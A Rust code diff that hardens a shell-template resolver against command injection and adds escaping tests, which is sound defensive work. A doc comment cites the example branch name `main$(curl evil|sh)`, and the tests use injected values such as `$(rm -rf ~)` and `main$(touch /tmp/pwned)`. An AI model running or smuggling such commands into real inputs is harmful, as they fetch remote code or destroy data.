@@ -66,16 +66,36 @@ pub fn resolve_template(template: &str, vars: &TemplateVariables) -> String {
 /// Without it, a value containing shell metacharacters (e.g. a branch named
 /// `main$(curl evil|sh)`) is concatenated into the command string and
 /// re-interpreted by the shell, yielding arbitrary command execution.
+///
+/// Like `resolve_template`, this scans the template once and substitutes each
+/// `$KEY` token from the *original* input. Escaped values are written straight
+/// to the output and never rescanned, so a value that happens to contain a
+/// `$OTHER_KEY` literal is left verbatim inside its quoting instead of being
+/// re-expanded by a later key — which would otherwise corrupt the value and
+/// break it out of the quotes meant to keep it inert.
 pub fn resolve_template_shell(template: &str, vars: &TemplateVariables) -> String {
-    let mut out = template.to_string();
-    for (key, value) in vars.pairs() {
-        let needle = format!("${key}");
-        let escaped = if cfg!(target_os = "windows") {
-            shell_escape_cmd(value)
-        } else {
-            shell_escape_posix(value)
-        };
-        out = out.replace(&needle, &escaped);
+    let pairs = vars.pairs();
+    let bytes = template.as_bytes();
+    let mut out = String::with_capacity(template.len());
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] == b'$' {
+            let rest = &template[i + 1..];
+            if let Some((key, value)) = pairs.iter().find(|(k, _)| rest.starts_with(*k)) {
+                let escaped = if cfg!(target_os = "windows") {
+                    shell_escape_cmd(value)
+                } else {
+                    shell_escape_posix(value)
+                };
+                out.push_str(&escaped);
+                i += 1 + key.len();
+                continue;
+            }
+        }
+        // Push a full UTF-8 char (templates may contain multi-byte chars).
+        let ch = template[i..].chars().next().expect("non-empty slice");
+        out.push(ch);
+        i += ch.len_utf8();
     }
     out
 }
@@ -271,5 +291,70 @@ mod tests {
     fn bare_dollar_is_preserved() {
         let v = vars("", "", "", "");
         assert_eq!(resolve_template("$ alone $", &v), "$ alone $");
+    }
+
+    #[test]
+    fn shell_resolution_does_not_reexpand_substituted_values() {
+        // WORKTREE_PATH's value literally contains the token `$BRANCH_NAME`.
+        // The previous sequential-replace implementation re-expanded it on the
+        // BRANCH_NAME pass, rewriting the value to `feature` and breaking it
+        // out of the single quotes that were supposed to keep it inert. The
+        // single-pass scan substitutes each token from the original template
+        // exactly once, so the literal `$BRANCH_NAME` survives verbatim.
+        let v = vars("repo", "/repo/$BRANCH_NAME", "feature", "main");
+        let out = resolve_template_shell("cd $WORKTREE_PATH", &v);
+        assert!(
+            out.contains("$BRANCH_NAME"),
+            "literal `$BRANCH_NAME` should survive verbatim, got {out:?}"
+        );
+        assert!(
+            !out.contains("feature"),
+            "substituted value was re-expanded, got {out:?}"
+        );
+    }
+
+    #[test]
+    fn posix_escape_wraps_plain_value_in_single_quotes() {
+        assert_eq!(shell_escape_posix("main"), "'main'");
+        assert_eq!(shell_escape_posix(""), "''");
+    }
+
+    #[test]
+    fn posix_escape_neutralizes_shell_metacharacters() {
+        // Inside single quotes, POSIX shells perform no expansion at all, so
+        // command substitution, parameter expansion, and globbing are inert.
+        assert_eq!(shell_escape_posix("$(rm -rf ~)"), "'$(rm -rf ~)'");
+        assert_eq!(shell_escape_posix("a; b | c & d"), "'a; b | c & d'");
+        assert_eq!(shell_escape_posix("`whoami`"), "'`whoami`'");
+    }
+
+    #[test]
+    fn posix_escape_rewrites_embedded_single_quote() {
+        // The only character that cannot live inside single quotes is `'`
+        // itself; it is closed, escaped as a literal, then reopened.
+        assert_eq!(shell_escape_posix("a'b"), "'a'\\''b'");
+    }
+
+    #[test]
+    fn cmd_escape_wraps_plain_value_in_double_quotes() {
+        assert_eq!(shell_escape_cmd("main"), "\"main\"");
+    }
+
+    #[test]
+    fn cmd_escape_caret_escapes_metacharacters_and_doubles_quotes() {
+        assert_eq!(shell_escape_cmd("a&b"), "\"a^&b\"");
+        assert_eq!(shell_escape_cmd("%PATH%"), "\"^%PATH^%\"");
+        assert_eq!(shell_escape_cmd("a|b<c>d"), "\"a^|b^<c^>d\"");
+        assert_eq!(shell_escape_cmd("a\"b"), "\"a\"\"b\"");
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn shell_resolution_neutralizes_dangerous_value_end_to_end() {
+        // A value carrying a command substitution must land fully single-quoted
+        // so `/bin/sh -c` reads it as one inert literal argument.
+        let v = vars("", "", "main$(touch /tmp/pwned)", "");
+        let out = resolve_template_shell("echo $BRANCH_NAME", &v);
+        assert_eq!(out, "echo 'main$(touch /tmp/pwned)'");
     }
 }
